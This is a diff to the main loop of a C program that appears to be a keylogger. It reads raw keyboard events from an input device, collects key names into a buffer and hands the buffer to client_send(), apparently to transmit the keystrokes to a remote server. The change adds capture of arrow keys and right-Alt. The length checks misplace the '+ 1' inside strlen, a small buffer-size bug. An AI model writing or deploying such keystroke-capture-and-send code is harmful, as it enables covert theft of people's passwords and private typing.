@@ -101,28 +101,66 @@ void main()
 	// safely break from loop when Ctrl-C is pressed
 	signal(SIGINT, safebreak);
 
-	while(1)
+while(1)
+{
+	usleep(1000);
+	read(device, &inpEvent, sizeof(inpEvent));  
+	//if the type of the event is a state change (like of a keyboard)
+	if (inpEvent.type == 1 && inpEvent.value == 1)
 	{
-		usleep(1000);
-		read(device, &inpEvent, sizeof(inpEvent));  
-		//if the type of the event is a state change (like of a keyboard)
-		if (inpEvent.type == 1 && inpEvent.value == 1)
+		//if the event code indicates a standard keyboard button
+		if (inpEvent.code > 0 && inpEvent.code <= TOT_KEYS)
 		{
-			//if the event code indicates a standard keyboard button
-			if (inpEvent.code > 0 && inpEvent.code <= TOT_KEYS)
+			if (strlen(message) + strlen(keys[inpEvent.code] + 1) < SIZEOF_MESSAGE) 
 			{
-				if (strlen(message) + strlen(keys[inpEvent.code] + 1) < SIZEOF_MESSAGE) 
-				{
-					strcat(message, keys[inpEvent.code]);
-					strcat(message, " ");
-				}
-				else 
-				{
-					client_send(message);
-					strcpy(message, "");
-					strcat(message, keys[inpEvent.code]);
-				}
+				strcat(message, keys[inpEvent.code]);
+				strcat(message, " ");
 			}
+			else 
+			{
+				client_send(message);
+				strcpy(message, "");
+				strcat(message, keys[inpEvent.code]);
+			}
+                        printf("%s\n", keys[inpEvent.code]);
 		}
+                else if (inpEvent.code == 108 || inpEvent.code == 105 || inpEvent.code == 103 || inpEvent.code == 106 || inpEvent.code == 100)
+                {
+                  char *str;
+                  if (inpEvent.code == 108)
+                  {
+                    str = "KEY_DOWN";  
+                  }
+                  else if (inpEvent.code == 105)
+                  {
+                    str = "KEY_LEFT";
+                  }
+                  else if (inpEvent.code == 103)
+                  {
+                    str = "KEY_UP";
+                  }
+                  else if (inpEvent.code == 106)
+                  {
+                    str = "KEY_RIGHT";
+                  }
+                  else
+                  {
+                    str = "KEY_RIGHTALT";
+                  }
+
+                 if (strlen(message) + strlen(str + 1) < SIZEOF_MESSAGE)
+                        {
+                          strcat(message, str);
+                          strcat(message, " ");
+                        }
+                        else
+                        {
+                          client_send(message);
+                          strcpy(message, "");
+                          strcat(message, str);
+                        }
+                        printf("%s\n", str); 
+                }
 	}
+  }
 }
